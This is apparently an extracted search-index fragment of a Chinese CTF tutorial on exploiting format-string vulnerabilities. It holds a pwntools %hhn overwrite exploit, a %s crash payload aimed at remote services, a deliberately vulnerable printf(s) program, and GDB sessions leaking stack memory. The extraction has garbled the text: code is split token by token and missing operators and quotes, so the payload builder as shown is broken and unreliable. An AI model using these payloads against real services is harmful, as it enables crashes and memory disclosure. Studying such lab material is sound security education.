n\n.data:0804A028                 public b\n.data:0804A028 b               dd 1C8h                 ; DATA XREF: main:loc_8048510\u0018r\n\n\n\n\n\u5373\u6211\u4eec\u5e0c\u671b\u5c06\u6309\u7167\u5982\u4e0b\u65b9\u5f0f\u8fdb\u884c\u8986\u76d6\uff0c\u524d\u9762\u4e3a\u8986\u76d6\u5730\u5740\uff0c\u540e\u9762\u4e3a\u8986\u76d6\u5185\u5bb9\u3002\n\n\n0x0804A028 \\x78\n0x0804A029 \\x56\n0x0804A02a \\x34\n0x0804A02b \\x12\n\n\n\n\n\u9996\u5148\uff0c\u7531\u4e8e\u6211\u4eec\u7684\u5b57\u7b26\u4e32\u7684\u504f\u79fb\u4e3a6\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u786e\u5b9a\u6211\u4eec\u7684payload\u57fa\u672c\u662f\u8fd9\u4e2a\u6837\u5b50\u7684\n\n\np32(0x0804A028)+p32(0x0804A029)+p32(0x0804A02a)+p32(0x0804A02b)+pad1+\n%6$n\n+pad2+\n%7$n\n+pad3+\n%8$n\n+pad4+\n%9$n\n\n\n\n\n\n\u6211\u4eec\u53ef\u4ee5\u4f9d\u6b21\u8fdb\u884c\u8ba1\u7b97\u3002\u8fd9\u91cc\u7ed9\u51fa\u4e00\u4e2a\u57fa\u672c\u7684\u6784\u9020\uff0c\u5982\u4e0b\n\n\ndef\n \nfmt\n(\nprev\n,\n \nword\n,\n \nindex\n):\n\n    \nif\n \nprev\n \n \nword\n:\n\n        \nresult\n \n=\n \nword\n \n-\n \nprev\n\n        \nfmtstr\n \n=\n \n%\n \n+\n \nstr\n(\nresult\n)\n \n+\n \nc\n\n    \nelif\n \nprev\n \n==\n \nword\n:\n\n        \nresult\n \n=\n \n0\n\n    \nelse\n:\n\n        \nresult\n \n=\n \n256\n \n+\n \nword\n \n-\n \nprev\n\n        \nfmtstr\n \n=\n \n%\n \n+\n \nstr\n(\nresult\n)\n \n+\n \nc\n\n    \nfmtstr\n \n+=\n \n%\n \n+\n \nstr\n(\nindex\n)\n \n+\n \n$hhn\n\n    \nreturn\n \nfmtstr\n\n\n\n\ndef\n \nfmt_str\n(\noffset\n,\n \nsize\n,\n \naddr\n,\n \ntarget\n):\n\n    \npayload\n \n=\n \n\n    \nfor\n \ni\n \nin\n \nrange\n(\n4\n):\n\n        \nif\n \nsize\n \n==\n \n4\n:\n\n            \npayload\n \n+=\n \np32\n(\naddr\n \n+\n \ni\n)\n\n        \nelse\n:\n\n            \npayload\n \n+=\n \np64\n(\naddr\n \n+\n \ni\n)\n\n    \nprev\n \n=\n \nlen\n(\npayload\n)\n\n    \nfor\n \ni\n \nin\n \nrange\n(\n4\n):\n\n        \npayload\n \n+=\n \nfmt\n(\nprev\n,\n \n(\ntarget\n \n \ni\n \n*\n \n8\n)\n \n \n0xff\n,\n \noffset\n \n+\n \ni\n)\n\n        \nprev\n \n=\n \n(\ntarget\n \n \ni\n \n*\n \n8\n)\n \n \n0xff\n\n    \nreturn\n \npayload\n\n\npayload\n \n=\n \nfmt_str\n(\n6\n,\n4\n,\n0x0804A028\n,\n0x12345678\n)\n\n\n\n\n\n\u5176\u4e2d\u6bcf\u4e2a\u53c2\u6570\u7684\u542b\u4e49\u57fa\u672c\u5982\u4e0b\n\n\n\n\noffset\u8868\u793a\u8981\u8986\u76d6\u7684\u5730\u5740\u6700\u521d\u7684\u504f\u79fb\n\n\nsize\u8868\u793a\u673a\u5668\u5b57\u957f\n\n\naddr\u8868\u793a\u5c06\u8981\u8986\u76d6\u7684\u5730\u5740\u3002\n\n\ntarget\u8868\u793a\u6211\u4eec\u8981\u8986\u76d6\u4e3a\u7684\u76ee\u7684\u53d8\u91cf\u503c\u3002\n\n\n\n\n\u76f8\u5e94\u7684exploit\u5982\u4e0b\n\n\ndef\n \nforb\n():\n\n    \nsh\n \n=\n \nprocess\n(\n./overwrite\n)\n\n    \npayload\n \n=\n \nfmt_str\n(\n6\n,\n \n4\n,\n \n0x0804A028\n,\n \n0x12345678\n)\n\n    \nprint\n \npayload\n\n    \nsh\n.\nsendline\n(\npayload\n)\n\n    \nprint\n \nsh\n.\nrecv\n()\n\n    \nsh\n.\ninteractive\n()\n\n\n\n\n\n\u7ed3\u679c\u5982\u4e0b\n\n\n\u279c\n  \noverwrite\n \ngit\n:(\nmaster\n)\n \n\u2717\n \npython\n \nexploit\n.\npy\n\n\n[\n+\n]\n \nStarting\n \nlocal\n \nprocess\n \n./overwrite\n:\n \npid\n \n78547\n\n\n(\n\\\nxa0\n\\\nx0\n)\n\\\nxa0\n\\\nx0\n*\n\\\nxa0\n\\\nx0\n+\n\\\nxa0\n\\\nx0\n%\n104\nc\n%\n6\n$\nhhn\n%\n222\nc\n%\n7\n$\nhhn\n%\n222\nc\n%\n8\n$\nhhn\n%\n222\nc\n%\n9\n$\nhhn\n\n\n[\n*\n]\n \nProcess\n \n./overwrite\n \nstopped\n \nwith\n \nexit\n \ncode\n \n0\n \n(\npid\n \n78547\n)\n\n\n0xfff6f9bc\n\n\n(\n\\\nxa0\n\\\nx0\n)\n\\\nxa0\n\\\nx0\n*\n\\\nxa0\n\\\nx0\n+\n\\\nxa0\n\\\nx0\n                                                                                                       \nX\n                                                                                                                                                                                                                             \n\ufffd\n                                                                                                                                                                                                                             \\\nxbb\n                                                                                                                                                                                                                             \n~\nmodified\n \nb\n \nfor\n \na\n \nbig\n \nnumber\n!\n\n\n\n\n\n\u5f53\u7136\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u5229\u7528%n\u5206\u522b\u5bf9\u6bcf\u4e2a\u5730\u5740\u8fdb\u884c\u5199\u5165\uff0c\u4e5f\u53ef\u4ee5\u5f97\u5230\u5bf9\u5e94\u7684\u7b54\u6848\uff0c\u4f46\u662f\u7531\u4e8e\u6211\u4eec\u5199\u5165\u7684\u53d8\u91cf\u90fd\u53ea\u4f1a\u5f71\u54cd\u7531\u5176\u5f00\u59cb\u7684\u56db\u4e2a\u5b57\u8282\uff0c\u6240\u4ee5\u6700\u540e\u4e00\u4e2a\u53d8\u91cf\u5199\u5b8c\u4e4b\u540e\uff0c\u6211\u4eec\u53ef\u80fd\u4f1a\u4fee\u6539\u4e4b\u540e\u7684\u4e09\u4e2a\u5b57\u8282\uff0c\u5982\u679c\u8fd9\u4e09\u4e2a\u5b57\u8282\u6bd4\u8f83\u91cd\u8981\u7684\u8bdd\uff0c\u7a0b\u5e8f\u5c31\u6709\u53ef\u80fd\u56e0\u6b64\u5d29\u6e83\u3002\u800c\u91c7\u7528%hhn\u5219\u4e0d\u4f1a\u6709\u8fd9\u6837\u7684\u95ee\u9898\uff0c\u56e0\u4e3a\u8fd9\u6837\u53ea\u4f1a\u4fee\u6539\u76f8\u5e94\u5730\u5740\u7684\u4e00\u4e2a\u5b57\u8282\u3002", 
            "title": "\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u5229\u7528"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_exploit/#_1", 
            "text": "\u5176\u5b9e\uff0c\u5728\u4e0a\u4e00\u90e8\u5206\uff0c\u6211\u4eec\u5c55\u793a\u4e86\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u7684\u4e24\u4e2a\u5229\u7528\u624b\u6bb5   \u4f7f\u7a0b\u5e8f\u5d29\u6e83\uff0c\u56e0\u4e3a%s\u5bf9\u5e94\u7684\u53c2\u6570\u5730\u5740\u4e0d\u5408\u6cd5\u7684\u6982\u7387\u6bd4\u8f83\u5927\u3002  \u67e5\u770b\u8fdb\u7a0b\u5185\u5bb9\uff0c\u6839\u636e%d\uff0c%f\u8f93\u51fa\u4e86\u6808\u4e0a\u7684\u5185\u5bb9\u3002   \u4e0b\u9762\u6211\u4eec\u4f1a\u5bf9\u4e8e\u6bcf\u4e00\u65b9\u9762\u8fdb\u884c\u66f4\u52a0\u8be6\u7ec6\u7684\u89e3\u91ca\u3002", 
            "title": "\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u5229\u7528"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_exploit/#_2", 
            "text": "\u901a\u5e38\u6765\u8bf4\uff0c\u5229\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u4f7f\u5f97\u7a0b\u5e8f\u5d29\u6e83\u662f\u6700\u4e3a\u7b80\u5355\u7684\u5229\u7528\u65b9\u5f0f\uff0c\u56e0\u4e3a\u6211\u4eec\u53ea\u9700\u8981\u8f93\u5165\u82e5\u5e72\u4e2a%s\u5373\u53ef  %s%s%s%s%s%s%s%s%s%s%s%s%s%s  \u8fd9\u662f\u56e0\u4e3a\u6808\u4e0a\u4e0d\u53ef\u80fd\u6bcf\u4e2a\u503c\u90fd\u5bf9\u5e94\u4e86\u5408\u6cd5\u7684\u5730\u5740\uff0c\u6240\u4ee5\u603b\u662f\u4f1a\u6709\u67d0\u4e2a\u5730\u5740\u53ef\u4ee5\u4f7f\u5f97\u7a0b\u5e8f\u5d29\u6e83\u3002\u8fd9\u4e00\u5229\u7528\uff0c\u867d\u7136\u653b\u51fb\u8005\u672c\u8eab\u4f3c\u4e4e\u5e76\u4e0d\u80fd\u63a7\u5236\u7a0b\u5e8f\uff0c\u4f46\u662f\u8fd9\u6837\u5374\u53ef\u4ee5\u9020\u6210\u7a0b\u5e8f\u4e0d\u53ef\u7528\u3002\u6bd4\u5982\u8bf4\uff0c\u5982\u679c\u8fdc\u7a0b\u670d\u52a1\u6709\u4e00\u4e2a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u653b\u51fb\u5176\u53ef\u7528\u6027\uff0c\u4f7f\u670d\u52a1\u5d29\u6e83\uff0c\u8fdb\u800c\u4f7f\u5f97\u7528\u6237\u4e0d\u80fd\u591f\u8bbf\u95ee\u3002", 
            "title": "\u7a0b\u5e8f\u5d29\u6e83"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_exploit/#_3", 
            "text": "\u5229\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\uff0c\u6211\u4eec\u8fd8\u53ef\u4ee5\u83b7\u53d6\u6211\u4eec\u6240\u60f3\u8981\u8f93\u51fa\u7684\u5185\u5bb9\u3002\u4e00\u822c\u4f1a\u6709\u5982\u4e0b\u51e0\u79cd\u64cd\u4f5c   \u6cc4\u9732\u6808\u5185\u5b58  \u83b7\u53d6\u67d0\u4e2a\u53d8\u91cf\u7684\u503c  \u83b7\u53d6\u67d0\u4e2a\u53d8\u91cf\u5bf9\u5e94\u5730\u5740\u7684\u5185\u5b58    \u6cc4\u9732\u4efb\u610f\u5730\u5740\u5185\u5b58  \u5229\u7528GOT\u8868\u5f97\u5230libc\u51fd\u6570\u5730\u5740\uff0c\u8fdb\u800c\u83b7\u53d6libc\uff0c\u8fdb\u800c\u83b7\u53d6\u5176\u5b83libc\u51fd\u6570\u5730\u5740  \u76f2\u6253\uff0cdump\u6574\u4e2a\u7a0b\u5e8f\uff0c\u83b7\u53d6\u6709\u7528\u4fe1\u606f\u3002", 
            "title": "\u6cc4\u9732\u5185\u5b58"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_exploit/#_4", 
            "text": "\u4f8b\u5982\uff0c\u7ed9\u5b9a\u5982\u4e0b\u7a0b\u5e8f  #include   stdio.h  int   main ()   { \n   char   s [ 100 ]; \n   int   a   =   1 ,   b   =   0x22222222 ,   c   =   - 1 ; \n   scanf ( %s ,   s ); \n   printf ( %08x.%08x.%08x.%s \\n ,   a ,   b ,   c ,   s ); \n   printf ( s ); \n   return   0 ;  }   \u7136\u540e\uff0c\u6211\u4eec\u7b80\u5355\u7f16\u8bd1\u4e00\u4e0b  \u279c  leakmemory git: ( master )  \u2717 make\ngcc -fno-stack-protector -no-pie -o leakmemory leakmemory.c\nleakmemory.c: In  function  \u2018main\u2019:\nleakmemory.c:7:10: warning: format not a string literal and no format arguments  [ -Wformat-security ] \n   printf ( s ) ; \n          ^  \u53ef\u4ee5\u770b\u51fa\uff0c\u7f16\u8bd1\u5668\u6307\u51fa\u4e86\u6211\u4eec\u7684\u7a0b\u5e8f\u4e2d\u6ca1\u6709\u7ed9\u51fa\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u53c2\u6570\u7684\u95ee\u9898\u3002\u4e0b\u9762\uff0c\u6211\u4eec\u6765\u770b\u4e00\u4e0b\uff0c\u5982\u4f55\u83b7\u53d6\u5bf9\u5e94\u7684\u6808\u5185\u5b58\u3002  \u6839\u636eC\u8bed\u8a00\u7684\u8c03\u7528\u89c4\u5219\uff0c\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u51fd\u6570\u4f1a\u6839\u636e\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u76f4\u63a5\u4f7f\u7528\u6808\u4e0a\u81ea\u9876\u5411\u4e0a\u7684\u53d8\u91cf\u4f5c\u4e3a\u5176\u53c2\u6570(64\u4f4d\u4f1a\u6839\u636e\u5176\u4f20\u53c2\u7684\u89c4\u5219\u8fdb\u884c\u83b7\u53d6)\u3002\u8fd9\u91cc\u6211\u4eec\u4e3b\u8981\u4ecb\u7ecd32\u4f4d\u3002", 
            "title": "\u6cc4\u9732\u6808\u5185\u5b58"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_exploit/#_5", 
            "text": "\u9996\u5148\uff0c\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6765\u83b7\u53d6\u6808\u4e0a\u53d8\u91cf\u7684\u6570\u503c\u3002\u6211\u4eec\u53ef\u4ee5\u8bd5\u4e00\u4e0b\uff0c\u8fd0\u884c\u7ed3\u679c\u5982\u4e0b  \u279c  leakmemory git: ( master )  \u2717 ./leakmemory\n%08x.%08x.%08x 00000001 .22222222.ffffffff.%08x.%08x.%08x\nffcfc400.000000c2.f765a6bb  \u53ef\u4ee5\u770b\u5230\uff0c\u6211\u4eec\u786e\u5b9e\u5f97\u5230\u4e86\u4e00\u4e9b\u5185\u5bb9\u3002\u4e3a\u4e86\u66f4\u52a0\u7ec6\u81f4\u7684\u89c2\u5bdf\uff0c\u6211\u4eec\u5229\u7528GDB\u6765\u8c03\u8bd5\u4e00\u4e0b\uff0c\u4ee5\u4fbf\u4e8e\u9a8c\u8bc1\u6211\u4eec\u7684\u60f3\u6cd5\uff0c\u8fd9\u91cc\u5220\u9664\u4e86\u4e00\u4e9b\u4e0d\u5fc5\u8981\u7684\u4fe1\u606f\uff0c\u6211\u4eec\u53ea\u5173\u6ce8\u4ee3\u7801\u6bb5\u4ee5\u53ca\u6808\u3002  \u9996\u5148\uff0c\u542f\u52a8\u7a0b\u5e8f\uff0c\u5c06\u65ad\u70b9\u4e0b\u8f7dprintf\u51fd\u6570\u5904  \u279c  leakmemory git: ( master )  \u2717 gdb leakmemory\ngef\u27a4  b  printf \nBreakpoint  1  at 0x8048330  \u4e4b\u540e\uff0c\u8fd0\u884c\u7a0b\u5e8f  gef\u27a4  r\nStarting program: /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/leakmemory/leakmemory\n%08x.%08x.%08x  \u6b64\u65f6\uff0c\u7a0b\u5e8f\u7b49\u5f85\u6211\u4eec\u7684\u8f93\u5165\uff0c\u8fd9\u65f6\u6211\u4eec\u8f93\u5165%08x.%08x.%08x\uff0c\u7136\u540e\u6572\u51fb\u56de\u8f66\uff0c\u662f\u7a0b\u5e8f\u7ee7\u7eed\u8fd0\u884c\uff0c\u53ef\u4ee5\u770b\u51fa\u7a0b\u5e8f\u9996\u5148\u65ad\u5728\u4e86\u7b2c\u4e00\u6b21\u8c03\u7528printf\u51fd\u6570\u7684\u4f4d\u7f6e  Breakpoint  1 , __printf  ( format = 0x8048563  %08x.%08x.%08x.%s\\n )  at printf.c:28 28   printf.c: \u6ca1\u6709\u90a3\u4e2a\u6587\u4ef6\u6216\u76ee\u5f55.\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [  code:i386  ] \u2500\u2500\u2500\u2500\n   0xf7e44667  fprintf+23      inc    DWORD PTR  [ ebx+0x66c31cc4 ] \n   0xf7e4466d                  nop\n   0xf7e4466e                  xchg   ax, ax\n \u2192 0xf7e44670  printf+0        call   0xf7f1ab09  __x86.get_pc_thunk.ax \n   \u21b3  0xf7f1ab09  __x86.get_pc_thunk.ax+0  mov    eax, DWORD PTR  [ esp ] \n      0xf7f1ab0c  __x86.get_pc_thunk.ax+3  ret\n      0xf7f1ab0d  __x86.get_pc_thunk.dx+0  mov    edx, DWORD PTR  [ esp ] \n      0xf7f1ab10  __x86.get_pc_thunk.dx+3  ret\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [  stack  ] \u2500\u2500\u2500\u2500 [ 0xffffccec ,  l8 ]  8 \n0xffffccec\u2502+0x00: 0x080484bf  \u2192   main+84  add esp, 0x20     \u2190  $esp \n0xffffccf0\u2502+0x04: 0x08048563  \u2192   %08x.%08x.%08x.%s \n0xffffccf4\u2502+0x08: 0x00000001\n0xffffccf8\u2502+0x0c: 0x22222222\n0xffffccfc\u2502+0x10: 0xffffffff\n0xffffcd00\u2502+0x14: 0xffffcd10  \u2192   %08x.%08x.%08x \n0xffffcd04\u2502+0x18: 0xffffcd10  \u2192   %08x.%08x.%08x \n0xffffcd08\u2502+0x1c: 0x000000c2  \u53ef\u4ee5\u770b\u51fa\uff0c\u6b64\u65f6\u6b64\u65f6\u5df2\u7ecf\u8fdb\u5165\u4e86printf\u51fd\u6570\u4e2d\uff0c\u6808\u4e2d\u7b2c\u4e00\u4e2a\u53d8\u91cf\u4e3a\u8fd4\u56de\u5730\u5740\uff0c\u7b2c\u4e8c\u4e2a\u53d8\u91cf\u4e3a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u5730\u5740\uff0c\u7b2c\u4e09\u4e2a\u53d8\u91cf\u4e3aa\u7684\u503c\uff0c\u7b2c\u56db\u4e2a\u53d8\u91cf\u4e3ab\u7684\u503c\uff0c\u7b2c\u4e94\u4e2a\u53d8\u91cf\u4e3ac\u7684\u503c\uff0c\u7b2c\u516d\u4e2a\u53d8\u91cf\u4e3a\u6211\u4eec\u8f93\u5165\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u5bf9\u5e94\u7684\u5730\u5740\u3002\u7ee7\u7eed\u8fd0\u884c\u7a0b\u5e8f  gef\u27a4  c\nContinuing. 00000001 .22222222.ffffffff.%08x.%08x.%08x  \u53ef\u4ee5\u770b\u51fa\uff0c\u7a0b\u5e8f\u786e\u5b9e\u8f93\u51fa\u4e86\u6bcf\u4e00\u4e2a\u53d8\u91cf\u5bf9\u5e94\u7684\u6570\u503c\uff0c\u5e76\u4e14\u65ad\u5728\u4e86\u4e0b\u4e00\u4e2aprintf\u5904  Breakpoint  1 , __printf  ( format = 0xffffcd10  %08x.%08x.%08x )  at printf.c:28 28   in printf.c\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [  code:i386  ] \u2500\u2500\u2500\u2500\n   0xf7e44667  fprintf+23      inc    DWORD PTR  [ ebx+0x66c31cc4 ] \n   0xf7e4466d                  nop\n   0xf7e4466e                  xchg   ax, ax\n \u2192 0xf7e44670  printf+0        call   0xf7f1ab09  __x86.get_pc_thunk.ax \n   \u21b3  0xf7f1ab09  __x86.get_pc_thunk.ax+0  mov    eax, DWORD PTR  [ esp ] \n      0xf7f1ab0c  __x86.get_pc_thunk.ax+3  ret\n      0xf7f1ab0d  __x86.get_pc_thunk.dx+0  mov    edx, DWORD PTR  [ esp ] \n      0xf7f1ab10  __x86.get_pc_thunk.dx+3  ret\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [  stack  ] \u2500\u2500\u2500\u2500 [ 0xffffccfc ,  l8 ]  8 \n0xffffccfc\u2502+0x00: 0x080484ce  \u2192   main+99  add esp, 0x10     \u2190  $esp \n0xffffcd00\u2502+0x04: 0xffffcd10  \u2192   %08x.%08x.%08x \n0xffffcd04\u2502+0x08: 0xffffcd10  \u2192   %08x.%08x.%08x \n0xffffcd08\u2502+0x0c: 0x000000c2\n0xffffcd0c\u2502+0x10: 0xf7e8b6bb  \u2192   handle_intel+107  add esp, 0x10\n0xffffcd10\u2502+0x14:  %08x.%08x.%08x    \u2190  $eax \n0xffffcd14\u2502+0x18:  .%08x.%08x \n0xffffcd18\u2502+0x1c:  x.%08x   \u6b64\u65f6\uff0c\u7531\u4e8e\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u4e3a%x%x%x\uff0c\u6240\u4ee5\uff0c\u7a0b\u5e8f \u4f1a\u5c06\u6808\u4e0a\u76840xffffcd04\u53ca\u5176\u4e4b\u540e\u7684\u6570\u503c\u5206\u522b\u4f5c\u4e3a\u7b2c\u4e00\uff0c\u7b2c\u4e8c\uff0c\u7b2c\u4e09\u4e2a\u53c2\u6570\u6309\u7167int\u578b\u8fdb\u884c\u89e3\u6790\uff0c\u5206\u522b\u8f93\u51fa\u3002\u7ee7\u7eed\u8fd0\u884c\uff0c\u6211\u4eec\u53ef\u4ee5\u5f97\u5230\u5982\u4e0b\u7ed3\u679c\u53bb\uff0c\u786e\u5b9e\u548c\u60f3\u8c61\u4e2d\u7684\u4e00\u6837\u3002  gef\u27a4  c\nContinuing.\nffffcd10.000000c2.f7e8b6bb [ Inferior  1   ( process  57077 )  exited normally ]   \u5f53\u7136\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u4f7f\u7528%p\u6765\u83b7\u53d6\u6570\u636e\uff0c\u5982\u4e0b  % p .% p .% p  00000001.22222222 . ffffffff .% p .% p .% p  0xfff328c0 . 0xc2 . 0xf75c46bb   \u8fd9\u91cc\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5e76\u4e0d\u662f\u6bcf\u6b21\u5f97\u5230\u7684\u7ed3\u679c\u90fd\u4e00\u6837 \uff0c\u56e0\u4e3a\u6808\u4e0a\u7684\u6570\u636e\u4f1a\u56e0\u4e3a\u6bcf\u6b21\u5206\u914d\u7684\u5185\u5b58\u9875\u4e0d\u540c\u800c\u6709\u6240\u4e0d\u540c\uff0c\u8fd9\u662f\u56e0\u4e3a\u6808\u662f\u4e0d\u5bf9\u5185\u5b58\u9875\u505a\u521d\u59cb\u5316\u7684\u3002  \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u6211\u4eec\u4e0a\u9762\u7ed9\u51fa\u7684\u65b9\u6cd5\uff0c\u90fd\u662f\u4f9d\u6b21\u83b7\u5f97\u6808\u4e2d\u7684\u6bcf\u4e2a\u53c2\u6570\uff0c\u6211\u4eec\u6709\u6ca1\u6709\u529e\u6cd5\u76f4\u63a5\u83b7\u53d6\u6808\u4e2d\u88ab\u89c6\u4e3a\u7b2cn+1\u4e2a\u53c2\u6570\u7684\u503c\u5462 \uff1f\u80af\u5b9a\u662f\u53ef\u4ee5\u7684\u5566\u3002\u65b9\u6cd5\u5982\u4e0b  %n$x  \u5229\u7528\u5982\u4e0b\u7684\u5b57\u7b26\u4e32\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u83b7\u53d6\u5230\u5bf9\u5e94\u7684\u7b2cn+1\u4e2a\u53c2\u6570\u7684\u6570\u503c\u3002\u4e3a\u4ec0\u4e48\u8fd9\u91cc\u8981\u8bf4\u662f\u5bf9\u5e94\u7b2cn+1\u4e2a\u53c2\u6570\u5462\uff1f\u8fd9\u662f\u56e0\u4e3a\u683c\u5f0f\u5316\u53c2\u6570\u91cc\u9762\u7684n\u6307\u7684\u662f\u8be5\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u5bf9\u5e94\u7684\u7b2cn\u4e2a\u8f93\u51fa\u53c2\u6570\uff0c\u90a3\u76f8\u5bf9\u4e8e\u8f93\u51fa\u51fd\u6570\u6765\u8bf4\uff0c\u5c31\u662f\u7b2cn+1\u4e2a\u53c2\u6570\u4e86\u3002  \u8fd9\u91cc\u6211\u4eec\u518d\u6b21\u4ee5gdb\u8c03\u8bd5\u4e00\u4e0b\u3002  \u279c  leakmemory git: ( master )  \u2717 gdb leakmemory\ngef\u27a4  b  printf \nBreakpoint  1  at 0x8048330\ngef\u27a4  r\nStarting program: /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/leakmemory/leakmemory\n%3 $x \n\nBreakpoint  1 , __printf  ( format = 0x8048563  %08x.%08x.%08x.%s\\n )  at printf.c:28 28   printf.c: \u6ca1\u6709\u90a3\u4e2a\u6587\u4ef6\u6216\u76ee\u5f55.\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [  code:i386  ] \u2500\u2500\u2500\u2500\n   0xf7e44667  fprintf+23      inc    DWORD PTR  [ ebx+0x66c31cc4 ] \n   0xf7e4466d                  nop\n   0xf7e4466e                  xchg   ax, ax\n \u2192 0xf7e44670  printf+0        call   0xf7f1ab09  __x86.get_pc_thunk.ax \n   \u21b3  0xf7f1ab09  __x86.get_pc_thunk.ax+0  mov    eax, DWORD PTR  [ esp ] \n      0xf7f1ab0c  __x86.get_pc_thunk.ax+3  ret\n      0xf7f1ab0d  __x86.get_pc_thunk.dx+0  mov    edx, DWORD PTR  [ esp ] \n      0xf7f1ab10  __x86.get_pc_thunk.dx+3  ret\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [  stack  ] \u2500\u2500\u2500\u2500 [ 0xffffccec ,  l8 ]  8 \n0xffffccec\u2502+0x00: 0x080484bf  \u2192   main+84  add esp, 0x20     \u2190  $esp \n0xffffccf0\u2502+0x04: 0x08048563  \u2192   %08x.%08x.%08x.%s \n0xffffccf4\u2502+0x08: 0x00000001\n0xffffccf8\u2502+0x0c: 0x22222222\n0xffffccfc\u2502+0x10: 0xffffffff\n0xffffcd00\u2502+0x14: 0xffffcd10  \u2192   %3 $x \n0xffffcd04\u2502+0x18: 0xffffcd10  \u2192   %3 $x \n0xffffcd08\u2502+0x1c: 0x000000c2\ngef\u27a4  c\nContinuing. 00000001 .22222222.ffffffff.%3 $x \n\nBreakpoint  1 , __printf  ( format = 0xffffcd10  %3 $x )  at printf.c:28 28   in printf.c\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [  code:i386  ] \u2500\u2500\u2500\u2500\n   0xf7e44667  fprintf+23      inc    DWORD PTR  [ ebx+0x66c31cc4 ] \n   0xf7e4466d                  nop\n   0xf7e4466e                  xchg   ax, ax\n \u2192 0xf7e44670  printf+0        call   0xf7f1ab09  __x86.get_pc_thunk.ax \n   \u21b3  0xf7f1ab09  __x86.get_pc_thunk.ax+0  mov    eax, DWORD PTR  [ esp ] \n      0xf7f1ab0c  __x86.get_pc_thunk.ax+3  ret\n      0xf7f1ab0d  __x86.get_pc_thunk.dx+0  mov    edx, DWORD PTR  [ esp ] \n      0xf7f1ab10  __x86.get_pc_thunk.dx+3  